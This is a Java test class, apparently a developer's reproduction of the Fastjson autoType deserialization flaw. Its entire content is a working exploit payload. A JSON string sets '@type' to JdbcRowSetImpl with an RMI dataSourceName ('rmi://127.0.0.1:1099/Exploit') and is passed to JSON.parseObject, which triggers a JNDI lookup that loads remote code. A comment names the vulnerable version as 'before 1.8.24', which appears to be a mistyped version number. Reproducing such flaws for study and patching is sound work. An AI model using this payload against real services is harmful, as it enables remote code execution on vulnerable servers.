package com.violin.busniss.error.fastjson.bug;

import com.alibaba.fastjson.JSON;

public class InjectJsonTester {
    public static void main(String[] args) {
        // 必须确保 fastJson的版本号在 1.8.24 以前
        String str = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true}";
        JSON.parseObject(str,Object.class);
    }
}
